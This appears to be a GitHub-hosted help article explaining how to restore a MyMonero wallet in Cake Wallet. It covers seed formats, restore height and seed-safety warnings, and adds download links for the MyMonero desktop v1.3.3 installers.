<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">MyMonero to Cake Wallet Migration</h1>
<p align="center">How to move your wallet access carefully and keep control of your XMR.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
You can restore a MyMonero wallet in Cake Wallet by choosing the restore/import option and entering the seed phrase that belongs to that wallet. First identify whether your seed has 13 or 25 words, protect it from disclosure, and allow the wallet to scan from an appropriate restore height.

## You'll see this if
- You want to use a wallet on a phone or another supported computer.
- MyMonero’s hosted login or web access is unavailable, but you still have your recovery phrase.
- You are moving to Cake Wallet and need to know what to prepare before starting.
- You are unsure whether to restore the existing wallet or send its balance to a fresh one.

## Why it happens
MyMonero’s final desktop release is v1.3.3. The desktop application can still open wallets and send XMR, but it is no longer maintained and receives no new features or security updates. MyMonero hosted servers and web wallet login stopped, so a hosted login should not be treated as a way to recover access. Two practical options remain: keep using the desktop app or restore the wallet in Cake Wallet.

Cake Wallet runs on iOS, Android, macOS, and Linux. Windows desktop builds are paused at the time of writing. Restoring does not move coins between addresses: it gives another wallet application the information needed to access the same wallet. A restore can take time because the application scans the blockchain from the chosen height. For background on the distinction between importing a seed and sending funds, see [MyMonero migration checklist](./mymonero-migration-checklist.md) and [sweeping funds to a new wallet](./mymonero-sweep-funds-new-wallet.md).

A 13-word MyMonero seed is a MyMonero-specific legacy format; a 25-word seed is standard Monero format. Do not assume the two are interchangeable or add words to make one match the other. Read [how to restore a 13-word MyMonero seed](./mymonero-13-word-seed-restore.md) or [migrate a 25-word Monero seed](./mymonero-25-word-seed-migration.md) for format-specific guidance.

---

## Fix
1. **Prepare privately.** Find the recovery phrase without photographing, emailing, messaging, or pasting it into a website. Nobody legitimate needs you to send them your seed or keys. Ignore unsolicited help that asks for them. Keep the phrase out of screen shares and support conversations.
2. **Confirm the format.** Count the words without exposing them to anyone. A MyMonero-specific phrase may contain 13 words; a standard Monero phrase has 25. If you cannot identify the format, pause rather than guessing. The guide to [MyMonero seed word counts](./mymonero-seed-13-vs-25-words.md) explains the distinction.
3. **Install Cake Wallet from a source you trust.** Use the official Cake Wallet distribution channel for the operating system you intend to use. Availability differs by platform; Windows desktop builds are paused at the time of writing. Do not install an app supplied by a stranger or a search advertisement.
4. **Choose restore or import.** In Cake Wallet, use the option to restore an existing wallet, not the option to create a new wallet. Follow the app’s prompts for the seed format. Enter the phrase only into the wallet application you have deliberately installed and verified. If the app rejects it, stop and check spelling, word count, and selected format; avoid repeated random edits.
5. **Set the restore height.** Restore height tells the wallet where to begin scanning. If known, use a height at or before the wallet’s creation or earliest relevant activity. An earlier height is safer when uncertain, but means a longer scan. Read [restore height explained](./mymonero-restore-height-explained.md) before choosing.
6. **Let scanning finish.** Keep the device connected and give the wallet time to synchronize. A balance that has not appeared yet does not by itself mean that funds are gone. Check the scan status and height before changing settings or restoring again.
7. **Verify access cautiously.** Compare the displayed wallet information with what you expect, and consider a small receive or send only after understanding the fees and destination. Never send a recovery phrase to “verify” a wallet. A seed restores wallet access; it is not a payment address.
8. **Keep a safe backup.** Store the seed offline in a private place you control. Do not rely on an app installation, cloud note, or screenshot as the only backup. The [safe seed backup guide](./mymonero-backup-seed-safely.md) covers practical precautions.

> [!TIP]
> You do not need to empty the old wallet merely because you restored it in another app. Restoring the same seed provides access to the same wallet; a sweep is a separate transaction to a different wallet.

> [!WARNING]
> Anyone who obtains your seed may be able to control the wallet. Never share it with support, a supposed recovery service, or someone claiming to be from a wallet team.

## If that did not work
If the phrase is rejected, stop before trying variations from memory. Confirm whether you have 13 or 25 words, check each word against your own written backup, and verify that you selected the corresponding restore flow. A missing or uncertain word is not a reason to send the partial phrase to another person. See [seed not accepted](./mymonero-seed-not-accepted.md) for safe checks.

If the wallet opens but shows no balance, first allow the scan to complete. Then review the restore height: starting too late can omit earlier activity, while starting earlier can take longer. Use the explanation of a zero balance after restore for further checks. Error 523 is general guidance that a server connection is unavailable; it does not establish that a seed or balance is invalid.

If you still have the MyMonero desktop application and can open the wallet, you may continue using it while you decide what to do. Its final release is v1.3.3 on GitHub, but it is no longer maintained. Do not assume that an import fee or server behavior from the past applies now; historically, MyMonero hosted servers charged a one-time fee to import a wallet created elsewhere.

## Prevention
Keep the seed written accurately and offline, and make sure you know which wallet it restores before you need it. Record a restore height if you have a reliable source for it, but never write the seed in the same exposed place as routine device notes. Keep wallet software current where updates are available, and treat MyMonero desktop as unmaintained software. Check the intended application and download source before entering sensitive information. When moving funds to a newly created wallet rather than restoring the old one, verify the new address on the device you control and understand that sweeping means sending all funds as a transaction.

## FAQ
<details><summary>Does restoring transfer my XMR to Cake Wallet?</summary>

No. Restoring provides access to the existing wallet; it does not create an on-chain transfer. To move funds to a different wallet, you must make a transaction, such as a sweep.

</details>

<details><summary>Can I restore a 13-word phrase?</summary>

A 13-word phrase is a MyMonero-specific legacy format. Choose a restore path that supports that format, and do not treat it as a standard 25-word phrase.

</details>

<details><summary>How long will restoration take?</summary>

It depends on how far back scanning starts and how much synchronization remains. An earlier restore height is safer when uncertain, but slower.

</details>

<details><summary>Is Cake Wallet available for Windows desktop?</summary>

Windows desktop builds are paused at the time of writing. Cake Wallet runs on iOS, Android, macOS, and Linux.

</details>

---

## Download MyMonero

- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [Restore a MyMonero 13-Word Seed](./mymonero-13-word-seed-restore.md) | Recognize the legacy seed format and restore it without exposing your recovery phrase. |
| [Migrate a MyMonero 25-Word Seed](./mymonero-25-word-seed-migration.md) | Restore a standard Monero phrase in another supported wallet and scan from a suitable height. |
| [MyMonero Restore Height Explained](./mymonero-restore-height-explained.md) | Understand the scan start point and choose a sensible value when restoring a wallet. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
